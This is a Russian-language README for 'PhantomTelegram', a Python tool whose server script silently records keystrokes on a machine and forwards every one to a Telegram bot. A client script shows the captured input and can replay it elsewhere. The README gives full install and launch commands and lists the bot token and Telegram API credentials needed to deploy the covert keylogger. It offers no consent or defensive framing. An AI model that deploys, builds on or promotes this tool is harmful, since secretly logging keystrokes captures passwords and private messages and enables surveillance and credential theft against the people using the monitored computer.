# PhantomTelegram

Два скрипта в папке `logger/` делают всё, что нужно:

- `logger/server.py` — тихо читает нажатия клавиш на исходной машине и шлёт каждое событие в Telegram-бота.
- `logger/client.py` — подключается к тому же боту, показывает входящие нажатия и, по желанию, нажимает те же клавиши на локальной машине.

## Установка
1. **Клонировать репозиторий и зайти в него**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **(Опционально) создать виртуальное окружение**
   ```bash
   python -m venv .venv
   # Windows
   .venv\\Scripts\\activate
   # Linux/macOS
   source .venv/bin/activate
   ```
3. **Поставить зависимости**
   ```bash
   pip install -r requirements.txt
   ```

## Настройка и запуск сервера (машина-источник)
1. Создайте Telegram-бота через @BotFather и получите **токен**.
2. Узнайте свой **Telegram user ID** (например, через @userinfobot).
3. Запустите сервер с переменными окружения:
   ```bash
   SERVER_BOT_TOKEN=<токен_бота> \
   TARGET_USER_ID=<ваш_user_id> \
   python logger/server.py
   ```
4. В Telegram напишите вашему боту `/start`. Бот будет присылать каждое нажатие. Командой `/stop` можно остановить скрипт.

> Ничего редактировать в файлах не нужно — все ключи передаются через переменные окружения.

## Настройка и запуск клиента (машина-приёмник)
1. Получите **API ID** и **API hash** на https://my.telegram.org.
2. Запустите клиента с переменными окружения:
   ```bash
   TG_API_ID=<api_id> \
   TG_API_HASH=<api_hash> \
   SERVER_BOT_USERNAME=<юзернейм_бота_сервера_без_@> \
   python logger/client.py
   ```
   - Переменная `TG_SESSION_NAME` по умолчанию `client_session` и задаёт имя файла сессии Telethon.
3. В окне клиента убедитесь, что подставился юзернейм бота, и нажмите **Подключиться**. Последние нажатия будут отображаться в окне; галочка **Копировать ввод** включает/выключает воспроизведение нажатий локально.

## Где что писать
- **SERVER_BOT_TOKEN** — токен бота, созданного вами для роли сервера (машина-источник).
- **TARGET_USER_ID** — ваш Telegram user ID, куда сервер шлёт события.
- **SERVER_BOT_USERNAME** — юзернейм этого же бота (нужен клиенту), без символа `@`.
- **TG_API_ID/TG_API_HASH** — учётные данные разработчика Telegram для клиента (машина-приёмник).
- **TG_SESSION_NAME** — имя файла сессии Telethon (необязательно менять).

## Зависимости
`requirements.txt` включает только нужное для работы двух скриптов: `pynput`, `pyTelegramBotAPI`, `telethon`.
